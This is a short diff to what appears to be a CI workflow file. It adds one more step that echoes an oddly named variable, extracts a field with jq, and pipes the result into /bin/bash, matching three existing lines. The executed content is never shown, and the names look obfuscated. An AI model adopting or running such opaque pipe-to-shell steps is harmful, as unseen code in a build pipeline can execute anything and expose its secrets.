@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$gk0" | jq -r .jo02 | /bin/bash
           echo $ost458 | jq -r .fz19 | /bin/bash
           echo $hbbz6586 | jq -r .r1 | /bin/bash
+          echo $wcyql88248 | jq -r .ivst929 | /bin/bash
 
       - name: Save archive
         if: always()
